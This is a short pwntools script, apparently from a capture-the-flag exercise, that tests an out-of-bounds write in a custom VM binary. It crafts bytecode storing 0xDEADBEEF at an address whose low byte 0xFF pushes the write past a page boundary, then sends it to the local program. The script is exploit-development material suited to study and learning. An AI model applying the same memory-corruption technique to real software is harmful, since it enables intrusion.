#!/usr/bin/env python3
"""
Test OOB write via STORE instruction.

STORE with mode 3: stores register value to memory at [dest_reg]
If dest_reg low byte is 0xFF, first byte writes at page[0xFF + 4] = page[0x103]!

STORE instruction format:
- Mode 3: 0b011xxxxx | opcode = 0x60 | 0x01 = 0x61
- Byte 0: 0x61
- Byte 1: dest_reg (address register)
- Byte 2: src_reg (value register)
"""
from pwn import *

context.log_level = 'error'

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def store_mem_reg(dest_reg, src_reg):
    """STORE [dest_reg], src_reg - mode 3"""
    return bytes([0x61, dest_reg, src_reg])

def hlt():
    return bytes([0x00])

# Test: set r0 to address with low byte 0xFF, store value there
code_addr = 0x10000
target_addr = 0x200FF  # page 0x200, offset 0xFF

code = b''
code += mov_reg_imm(0, target_addr)      # r0 = 0x200FF
code += mov_reg_imm(1, 0xDEADBEEF)        # r1 = value to store
code += store_mem_reg(0, 1)               # STORE [r0], r1
code += hlt()

print(f"[*] STORE OOB Test")
print(f"[*] Target address: 0x{target_addr:x}")
print(f"[*] Low byte: 0xFF -> write at page[0x103]")
print(f"[*] Code: {code.hex()}")

p = process(['./mqda'])
p.recvuntil(b'Code Address> ')
p.sendline(str(code_addr).encode())
p.recvuntil(b'Code Length> ')
p.sendline(str(len(code)).encode())
p.recvuntil(b'Code> ')
p.send(code)
p.recvuntil(b'Entry IP> ')
p.sendline(str(code_addr).encode())

output = p.recvall(timeout=2)
print(f"[*] Output: {output}")
p.close()
